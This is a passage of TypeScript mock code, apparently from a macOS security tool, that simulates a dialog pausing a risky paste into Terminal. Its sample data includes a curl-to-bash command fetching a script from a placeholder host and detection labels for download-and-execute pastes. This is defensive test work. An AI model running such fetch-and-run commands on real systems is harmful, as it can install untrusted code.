  // ?mock=paste-blocked shows the paused-paste dialog once, as if a curl-to-shell command were pasted in Terminal;
  // ?mock=paste-too-long, as if the pasted text were over the 1 MiB check limit (paused unread, never let through).
  if (flags.has('paste-blocked') || flags.has('paste-too-long')) {
    const long = flags.has('paste-too-long');
    const blocked = {
      id: 'paste-1',
      appName: 'Terminal',
      bundleId: 'com.apple.Terminal',
      patterns: long ? ['too_long' as const] : ['pipe_to_interpreter' as const, 'download_execute' as const],
      preview: long ? 'x'.repeat(300) : 'curl -fsSL https://example.invalid/install.sh | bash',
      expiresAt: Date.now() + 60_000
    };
    pastes.add(blocked.id);
    scheduler.later(() => void ipcEvents.pasteBlocked.emit(blocked), tickMs * 4);
  }

  function stop() {
    scheduler.stop();
  }

  return { handlers, stop, scanStep, installFailure };
}
